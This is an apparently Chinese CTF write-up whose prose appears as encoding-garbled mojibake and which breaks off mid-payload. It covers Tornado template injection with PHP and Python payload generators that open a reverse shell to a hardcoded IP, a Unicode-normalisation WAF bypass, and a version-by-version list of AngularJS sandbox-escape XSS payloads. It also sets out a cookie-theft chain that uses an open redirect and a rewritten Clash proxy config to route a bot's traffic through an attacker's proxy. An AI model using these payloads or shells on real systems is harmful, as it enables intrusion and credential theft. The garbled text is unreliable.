<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if test &#x3D;&#x3D; lucky_number %&#125;</span><br><span class="line">	&lt;div class&#x3D;&quot;center&quot;&gt;You&#39;re so lucky&lt;&#x2F;div&gt;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">	&lt;div class&#x3D;&quot;center&quot;&gt;You&#39;re not lucky enough&lt;&#x2F;div&gt;</span><br><span class="line">&#123;% end %&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å€¼ç›´æ¥åŠ è½½è¿›æ¨¡æ¿ï¼Œç„¶åå’Œ<code>lucky_number</code>æ¯”è¾ƒ</p>
<p>è¿™é‡Œ<code>tornado</code>è§£ææ¨¡æ¿æ˜¯ç›´æ¥æ‹¼æ¥çš„ä»£ç </p>
<p>è¿™é‡Œå¯ä»¥æ„é€ ç±»ä¼¼<code>a1=str(bytearray([xx]))[-3:-2]</code>ä¾æ¬¡æ„é€ å­—ç¬¦ä¸²</p>
<p>æœ€åæ„é€ <code>eval(a1+a2+a3)</code>æ‰§è¡Œä»£ç ï¼Œç”Ÿæˆè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;bash -c \&#x27;exec bash -i &amp;&gt;/dev/tcp/134.175.168.213/1234 &lt;&amp;1\&#x27;&quot;)&#x27;</span>;</span><br><span class="line">$result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$eval = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)</span><br><span class="line">&#123;</span><br><span class="line">	$result .= <span class="string">&#x27;a&#x27;</span>.$i.<span class="string">&#x27;=str(bytearray([0x&#x27;</span>.bin2hex($a[$i]).<span class="string">&#x27;]))[-3:-2]&#x27;</span>.PHP_EOL;</span><br><span class="line">	$eval = $eval.<span class="string">&#x27;a&#x27;</span>.$i.<span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> substr($result,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;eval(&#x27;</span>.substr($eval,<span class="number">0</span>,<span class="number">-1</span>).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Nu1Læˆ˜é˜Ÿè§£æ³•"><a href="#Nu1Læˆ˜é˜Ÿè§£æ³•" class="headerlink" title="Nu1Læˆ˜é˜Ÿè§£æ³•"></a><code>Nu1L</code>æˆ˜é˜Ÿè§£æ³•</h2><p>ç›´æ¥ç”¨<code>unicode normalize</code>ï¼Œå¯¼è‡´ <code>exec</code> å¯ä»¥æ‰§è¡Œ <code>unicode</code> ä»£ç </p>
<p>å¯ä»¥åˆ©ç”¨ç‰¹æ®Šçš„å­—ç¬¦ç»•è¿‡<code>waf</code>å¦‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">áµ‰Ë£áµ‰á¶œ</span><br><span class="line">ğ‘’ğ‘¥ğ‘’ğ‘</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;import os;os.system(&quot;bash -c \&#x27;exec bash -i &amp;&gt;/dev/tcp/134.175.168.213/1234 &lt;&amp;1\&#x27;&quot;)&#x27;</span>;</span><br><span class="line">$result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)</span><br><span class="line">&#123;</span><br><span class="line">	$result .= <span class="string">&#x27;bytes([&#x27;</span>.ord($a[$i]).<span class="string">&#x27;])+&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> substr($result,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>çœ‹äº†é˜Ÿé‡Œ<code>r2</code>å¸ˆå‚…çš„è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unicodedata</span><br><span class="line">function=<span class="string">&quot;exec&quot;</span></span><br><span class="line">args=<span class="string">&#x27;import os;os.system(&quot;calc&quot;)&#x27;</span></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> function:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65535</span>):</span><br><span class="line">        <span class="keyword">if</span> ch!=chr(i) <span class="keyword">and</span> unicodedata.normalize(<span class="string">&quot;NFKC&quot;</span>,chr(i))==ch:</span><br><span class="line">            payload+=chr(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">payload+=<span class="string">&quot;(&quot;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> args:</span><br><span class="line">    payload+=<span class="string">&quot;bytes([%d])+&quot;</span>%(ord(ch))</span><br><span class="line">payload=payload[:len(payload)<span class="number">-1</span>]</span><br><span class="line">payload+=<span class="string">&quot;)&quot;</span></span><br><span class="line">print(payload)</span><br><span class="line">eval(payload)</span><br></pre></td></tr></table></figure>

<h1 id="granddadâ€™s-guestbook"><a href="#granddadâ€™s-guestbook" class="headerlink" title="granddadâ€™s guestbook"></a>granddadâ€™s guestbook</h1><p>æœ¬é¢˜æ‰€æ¬ ç¼ºçš„çŸ¥è¯†ï¼š</p>
<p><code>AngularJS</code>æ˜¯ä¸€ä¸ªè‘—åçš„åŸºäº<code>JavaScript</code>çš„å¼€æº<code>Web</code>æ¡†æ¶ï¼Œç”¨äºå‰ç«¯ç¼–ç¨‹</p>
<p><code>Angular&lt;1.6</code>å†…çš„å…¸å‹<code>XSS payload</code>å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; 7 * 7 &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ<code>payload</code>æˆåŠŸæ‰§è¡Œï¼Œç»“æœ<code>49</code>å°†ä¼šå‡ºç°</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/angular.js/1.1.5/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span>&#123;&#123; 7 * 7 &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯ä¸€äº› <code>AngularJS</code> ç»•è¿‡çš„ <code>Payload</code>ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.0.1 - 1.1.5</span></span><br><span class="line">&#123;&#123;constructor.constructor(<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2.0 - 1.2.1</span></span><br><span class="line">&#123;&#123;a=<span class="string">&#x27;constructor&#x27;</span>;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,<span class="number">0</span>,<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2.2 - 1.2.5</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>[&#123;<span class="attr">toString</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].charAt=<span class="string">&#x27;&#x27;</span>.valueOf;$eval(<span class="string">&quot;x=&#x27;&quot;</span>+(y=<span class="string">&#x27;if(!window\\u002ex)alert(window\\u002ex=1)&#x27;</span>)+<span class="built_in">eval</span>(y)+<span class="string">&quot;&#x27;&quot;</span>);&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2.6 - 1.2.18</span></span><br><span class="line">&#123;&#123;(_=<span class="string">&#x27;&#x27;</span>.sub).call.call(&#123;&#125;[$=<span class="string">&#x27;constructor&#x27;</span>].getOwnPropertyDescriptor(_.__proto__,$).value,<span class="number">0</span>,<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2.19 - 1.2.23</span></span><br><span class="line">&#123;&#123;toString.constructor.prototype.toString=toString.constructor.prototype.call;[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;alert(1)&quot;</span>].sort(toString.constructor);&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2.24 - 1.2.29</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=<span class="string">&#x27;&#x27;</span>.valueOf;$eval(<span class="string">&quot;x=&#x27;\&quot;+(y=&#x27;if(!window\\u002ex)alert(window\\u002ex=1)&#x27;)+eval(y)+\&quot;&#x27;&quot;</span>);&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.3.0</span></span><br><span class="line">&#123;&#123;!ready &amp;&amp; (ready = <span class="literal">true</span>) &amp;&amp; (</span><br><span class="line">!call</span><br><span class="line">? $$watchers[<span class="number">0</span>].get(toString.constructor.prototype)</span><br><span class="line">: (a = apply) &amp;&amp;</span><br><span class="line">(apply = <span class="keyword">constructor</span>) &amp;&amp;</span><br><span class="line">(valueOf = call) &amp;&amp;</span><br><span class="line">(&#x27;&#x27;+&#x27;&#x27;.toString(</span><br><span class="line">&#x27;F = Function.prototype;&#x27; +</span><br><span class="line">&#x27;F.apply = F.a;&#x27; +</span><br><span class="line">&#x27;delete F.a;&#x27; +</span><br><span class="line">&#x27;delete F.valueOf;&#x27; +</span><br><span class="line">&#x27;alert(1);&#x27;</span><br><span class="line">))</span><br><span class="line">);&#125;&#125;</span><br><span class="line"></span><br><span class="line">//1.3.1 - 1.3.2</span><br><span class="line">&#123;&#123;</span><br><span class="line">&#123;&#125;[&#123;<span class="attr">toString</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].assign=[].join;</span><br><span class="line"><span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=<span class="string">&#x27;&#x27;</span>.valueOf;</span><br><span class="line"> $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.3.3 - 1.3.18</span></span><br><span class="line">&#123;&#123;&#123;&#125;[&#123;<span class="attr">toString</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].assign=[].join;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;</span><br><span class="line"> $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>); &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.3.19</span></span><br><span class="line">&#123;&#123;</span><br><span class="line"><span class="string">&#x27;a&#x27;</span>[&#123;<span class="attr">toString</span>:<span class="literal">false</span>,<span class="attr">valueOf</span>:[].join,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].charAt=[].join;</span><br><span class="line"> $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.3.20</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;$eval(<span class="string">&#x27;x=alert(1)&#x27;</span>);&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.4.0 - 1.4.9</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;$eval(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.5.0 - 1.5.8</span></span><br><span class="line">&#123;&#123;x = &#123;<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;&#x27;</span>.constructor.prototype&#125;; x[<span class="string">&#x27;y&#x27;</span>].charAt=[].join;$eval(<span class="string">&#x27;x=alert(1)&#x27;</span>);&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;a=toString().constructor.prototype;a.charAt=a.trim;$eval(<span class="string">&#x27;a,alert(42),a&#x27;</span>)&#125;&#125;<span class="string">&#x27;);&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//1.5.9 - 1.5.11</span></span><br><span class="line"><span class="string">&#123;&#123;</span></span><br><span class="line"><span class="string"> c=&#x27;</span><span class="string">&#x27;.sub.call;b=&#x27;</span><span class="string">&#x27;.sub.bind;a=&#x27;</span><span class="string">&#x27;.sub.apply;</span></span><br><span class="line"><span class="string"> c.$apply=$apply;c.$eval=b;op=$root.$$phase;</span></span><br><span class="line"><span class="string"> $root.$$phase=null;od=$root.$digest;$root.$digest=(&#123;&#125;).toString;</span></span><br><span class="line"><span class="string"> C=c.$apply(c);$root.$$phase=op;$root.$digest=od;</span></span><br><span class="line"><span class="string"> B=C(b,c,b);$evalAsync(&quot;</span></span><br><span class="line"><span class="string"> astNode=pop();astNode.type=&#x27;</span>UnaryExpression<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"> astNode.operator=&#x27;</span>(<span class="built_in">window</span>.X?void0:(<span class="built_in">window</span>.X=<span class="literal">true</span>,alert(<span class="number">1</span>)))+<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"> astNode.argument=&#123;type:&#x27;</span>Identifier<span class="string">&#x27;,name:&#x27;</span>foo<span class="string">&#x27;&#125;;</span></span><br><span class="line"><span class="string">&quot;);</span></span><br><span class="line"><span class="string"> m1=B($$asyncQueue.pop().expression,null,$root);</span></span><br><span class="line"><span class="string"> m2=B(C,null,m1);[].push.apply=m2;a=&#x27;</span><span class="string">&#x27;.sub;</span></span><br><span class="line"><span class="string"> $eval(&#x27;</span>a(b.c)<span class="string">&#x27;);[].push.apply=a;</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>æ›´åŠ è¯¦ç»†çš„å¯å‚è€ƒï¼š<code>https://xz.aliyun.com/t/4638</code></p>
<p>æœ¬é¢˜åœ¨æŠ¥å‘Š<code>Report</code>å¤„å¯ä»¥æäº¤<code>url</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æäº¤â¼€ä¸ªå¹³å°<code>XSS</code>æ¥å®ç°å¯¹ç®¡ç†å‘˜çš„ä¿¡æ¯è¿›è¡Œè¯»å–ï¼Œå‘ç°åœ¨å‰ç«¯æºç ä¸­å¼•å…¥äº†<code>angular.js</code>ï¼Œå¹¶ä¸”<code>ng-app</code>æ˜¯å¼€å¯çŠ¶æ€ï¼Œå› æ­¤å°±å»æ‰¾<code>angular.js</code>çš„<code>csti</code>çš„ç›¸å…³ä¿¡æ¯</p>
<p>ç„¶è€Œæœ¬é¢˜çš„<code>angular.js</code>æ˜¯<code>1.8.8</code>ç‰ˆæœ¬çš„ï¼Œé»˜è®¤<code>1.6</code>ä»¥å<code>angular</code>é¡¹ç›®ç»„å°±å…³é—­äº†æ²™ç›’ï¼Œæ‰€ä»¥æ²™ç›’ä¸ç”¨ç»•è¿‡ï¼Œç›´æ¥ç”¨<code>payload</code>æ‰“å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;constructor.constructor(&#39;alert(1)&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œå°±å¯ä»¥æˆåŠŸè§¦å‘<code>xss</code></p>
<h1 id="scientific-adfree-networking"><a href="#scientific-adfree-networking" class="headerlink" title="scientific_adfree_networking"></a>scientific_adfree_networking</h1><p>è¿™é¢˜ä¸»è¦çœ‹æ®‹ç¯å¸ˆå‚…çš„è§£é¢˜è¿‡ç¨‹ï¼Œé¢˜ç›®çš„æ€»ä½“æ€è·¯</p>
<ol>
<li>åœ¨<code>report</code>çš„æ—¶å€™è®©<code>bot</code>è®¿é—®æˆ‘ä»¬<code>vps</code>çš„<code>html</code>æ–‡ä»¶</li>
<li>å…¶ä¸­çš„<code>/logout?next=</code>å®ç°ä»»æ„è·³è½¬è®¿é—®æˆ‘ä»¬<code>vps</code>çš„<code>html</code>æ–‡ä»¶å¯ä»¥è§¦å‘<code>js</code>ä»£ç </li>
<li><code>js</code>ä»£ç ä¸­å†™å¥½<code>clash</code>ä»£ç†çš„é…ç½®å¯ä»¥é€šè¿‡<code>external-controller</code>æ§åˆ¶<code>api</code>æ¥èµ°è‡ªå·±çš„ä»£ç†è·å–<code>cookie</code></li>
</ol>
<h2 id="clashä»£ç†"><a href="#clashä»£ç†" class="headerlink" title="clashä»£ç†"></a>clashä»£ç†</h2><p>é¢˜ç›®ä¸­çš„æµè§ˆå™¨ä½¿ç”¨çš„æ˜¯<code>clash</code>ä»£ç†ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>clash</code>é…ç½®ä¸­çš„<code>external-controller</code>é€‰é¡¹æ¥æŒ‡å®š<code>api</code>çš„ä½ç½®ï¼Œé¢˜ç›®ä¸­çš„<code>api</code>çš„ä½ç½®åœ¨<code>127.0.0.1:9090</code></p>
<p>æ€»ä½“çš„æ€è·¯å°±æ˜¯æ˜¯ä¿®æ”¹<code>clash</code>çš„é…ç½®ï¼Œè®©æµè§ˆå™¨èµ°æˆ‘ä»¬çš„ä»£ç†ï¼Œç„¶åå†æ¬¡è®¿é—®<code>blog.tomswebsite.com:8888</code>ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±èƒ½æŠ“åˆ°<code>bot</code>ç™»é™†<code>blog.tomswebsite.com:8888</code> çš„<code>cookie</code></p>
<p>è¿™é‡Œä¿®æ”¹çš„<code>clash</code>é…ç½®ä¸º</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mixed-port: <span class="number">1080</span></span><br><span class="line">allow-lan: <span class="literal">false</span></span><br><span class="line">mode: Rule</span><br><span class="line">log-level: debug</span><br><span class="line">external-controller: <span class="string">&#x27;127.0.0.1:9090&#x27;</span></span><br><span class="line"></span><br><span class="line">proxies:</span><br><span class="line">  - name: <span class="string">&#x27;http&#x27;</span></span><br><span class="line">    type: http</span><br><span class="line">    server: <span class="number">159.75</span><span class="number">.23</span><span class="number">.54</span></span><br><span class="line">    port: <span class="number">20002</span></span><br><span class="line"></span><br><span class="line">proxy-groups:</span><br><span class="line">  - name: <span class="string">&#x27;jrxnm&#x27;</span></span><br><span class="line">    type: select</span><br><span class="line">    proxies:</span><br><span class="line">      - http</span><br><span class="line"></span><br><span class="line">rules:</span><br><span class="line"> - IP-CIDR,<span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span>,jrxnm</span><br><span class="line"> - MATCH,jrxnm</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>159.75.23.54:20002</code>æ˜¯è‡ªå·±çš„ä»£ç†æœåŠ¡å™¨</p>
<h2 id="httpä»£ç†"><a href="#httpä»£ç†" class="headerlink" title="httpä»£ç†"></a>httpä»£ç†</h2><p><code>HTTP</code> ä»£ç†å­˜åœ¨ä¸¤ç§å½¢å¼</p>
<ul>
<li>ç¬¬ä¸€ç§æ˜¯ <code>RFC 7230 - HTTP/1.1: Message Syntax and Routing</code></li>
</ul>
<p>è¿™ç§ä»£ç†æ‰®æ¼”çš„æ˜¯ã€Œä¸­é—´äººã€è§’è‰²ï¼Œå¯¹äºè¿æ¥åˆ°å®ƒçš„å®¢æˆ·ç«¯æ¥è¯´ï¼Œå®ƒæ˜¯æœåŠ¡ç«¯ï¼›å¯¹äºè¦è¿æ¥çš„æœåŠ¡ç«¯æ¥è¯´ï¼Œå®ƒæ˜¯å®¢æˆ·ç«¯ï¼Œå®ƒå°±è´Ÿè´£åœ¨ä¸¤ç«¯ä¹‹é—´æ¥å›ä¼ é€ <code>HTTP</code> æŠ¥æ–‡</p>
<p>ç„¶åä»€ä¹ˆæ˜¯æ­£å‘ä»£ç†å’Œåå‘ä»£ç†å‘¢</p>
<p>æ­£å‘ä»£ç†ï¼šæˆ‘ä»¬å›½å†…è®¿é—®è°·æ­Œï¼Œç›´æ¥è®¿é—®è®¿é—®ä¸åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªæ­£å‘ä»£ç†æœåŠ¡å™¨ï¼Œè¯·æ±‚å‘åˆ°ä»£ç†æœï¼Œä»£ç†æœåŠ¡å™¨èƒ½å¤Ÿè®¿é—®è°·æ­Œï¼Œè¿™æ ·ç”±ä»£ç†å»è°·æ­Œå–åˆ°è¿”å›æ•°æ®ï¼Œå†è¿”å›ç»™æˆ‘ä»¬ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½è®¿é—®è°·æ­Œäº†</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210906211610556.png" alt="image-20210906211610556"></p>
<p>åå‘ä»£ç†ï¼šæŒ‡ä»¥ä»£ç†æœåŠ¡å™¨æ¥æ¥å—<code>internet</code>ä¸Šçš„è¿æ¥è¯·æ±‚ï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ï¼Œå¹¶å°†ä»æœåŠ¡å™¨ä¸Šå¾—åˆ°çš„ç»“æœè¿”å›ç»™<code>internet</code>ä¸Šè¯·æ±‚è¿æ¥çš„å®¢æˆ·ç«¯</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210906211623115.png" alt="image-20210906211623115"></p>
<ul>
<li>ç¬¬äºŒç§æ˜¯ <code>Tunneling TCP based protocols through Web proxy servers</code>ï¼ˆé€šè¿‡ Web ä»£ç†æœåŠ¡å™¨ç”¨éš§é“æ–¹å¼ä¼ è¾“åŸºäº TCP çš„åè®®ï¼‰</li>
</ul>
<p><code>HTTP</code> å®¢æˆ·ç«¯é€šè¿‡ <code>CONNECT</code> æ–¹æ³•è¯·æ±‚éš§é“ä»£ç†åˆ›å»ºä¸€æ¡åˆ°è¾¾ä»»æ„ç›®çš„æœåŠ¡å™¨å’Œç«¯å£çš„ <code>TCP</code> è¿æ¥ï¼Œå¹¶å¯¹å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„åç»§æ•°æ®è¿›è¡Œç›²è½¬å‘</p>
<p>æœ€åï¼Œå°†ä¸¤ç§ä»£ç†çš„å®ç°ä»£ç åˆäºŒä¸ºä¸€ï¼Œå°±å¯ä»¥å¾—åˆ°å…¨åŠŸèƒ½çš„ <code>Proxy</code> ç¨‹åº</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">cReq, cRes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> u = url.parse(cReq.url);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> options = &#123;</span><br><span class="line">        hostname : u.hostname, </span><br><span class="line">        port     : u.port || <span class="number">80</span>,</span><br><span class="line">        path     : u.path,       </span><br><span class="line">        method     : cReq.method,</span><br><span class="line">        headers     : cReq.headers</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> pReq = http.request(options, <span class="function"><span class="keyword">function</span>(<span class="params">pRes</span>) </span>&#123;</span><br><span class="line">        cRes.writeHead(pRes.statusCode, pRes.headers);</span><br><span class="line">        pRes.pipe(cRes);</span><br><span class="line">    &#125;).on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        cRes.end();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    cReq.pipe(pReq);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params">cReq, cSock</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> u = url.parse(<span class="string">&#x27;http://&#x27;</span> + cReq.url);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> pSock = net.connect(u.port, u.hostname, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        cSock.write(<span class="string">&#x27;HTTP/1.1 200 Connection Established\r\n\r\n&#x27;</span>);</span><br><span class="line">        pSock.pipe(cSock);</span><br><span class="line">    &#125;).on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        cSock.end();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    cSock.pipe(pSock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http.createServer()</span><br><span class="line">    .on(<span class="string">&#x27;request&#x27;</span>, request)</span><br><span class="line">    .on(<span class="string">&#x27;connect&#x27;</span>, connect)</span><br><span class="line">    .listen(<span class="number">8888</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±æ˜¯ç”¨æ¥æ¥æ”¶<code>cookie</code>çš„ä»£ç†ï¼Œè¿™é‡Œéœ€è¦å¾€æœåŠ¡å™¨<code>hosts</code>æ·»åŠ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 blog.tomswebsite.com</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨æœ¬åœ°<code>8888</code>ç«¯å£è¿›è¡Œ<code>nc</code>çš„ç›‘å¬</p>
<h2 id="ä»»æ„è·³è½¬"><a href="#ä»»æ„è·³è½¬" class="headerlink" title="ä»»æ„è·³è½¬"></a>ä»»æ„è·³è½¬</h2><p>åœ¨<code>/logut?next=xxxx</code>æ˜¯å­˜åœ¨ä»»æ„<code>url</code>è·³è½¬çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°† <code>/logout?next=</code> è®¾ç½®æˆè‡ªå·±<code>vps</code>ï¼Œæäº¤åé¦ˆï¼Œè®©<code>bot</code>æ¥è®¿é—®æˆ‘ä»¬çš„<code>vps</code>ï¼Œå½“ä»–æ¥è®¿é—®æ—¶ï¼Œå°±è§¦å‘äº†<code>js</code>ä»£ç çš„æ‰§è¡Œï¼Œè®©<code>bot</code>å»è¯·æ±‚<code>restful</code>æ¥å£ï¼Œè®¾ç½®ä»£ç†ä¸ºæˆ‘ä»¬<code>vps</code></p>
<p><code>payload</code>å¦‚ä¸‹</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">sleep</span> (<span class="params">time</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(resolve, time));</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">setConfig</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        config = <span class="string">&#x27;&#123;&quot;payload&quot;:&quot;mixed-port: 1080\\nallow-lan: true\\nmode: Rule\\nlog-level: debug\\nexternal-controller: \&#x27;127.0.0.1:9090\&#x27;\\n\\nproxies:\\n  - name: \&#x27;http\&#x27;\\n    type: http\\n    server: 159.75.23.54\\n    port: 20002\\n\\nproxy-groups:\\n  - name: \&#x27;jrxnm\&#x27;\\n    type: select\\n    proxies:\\n      - http\\n\\nrules:\\n - IP-CIDR,127.0.0.0/8,jrxnm\\n - 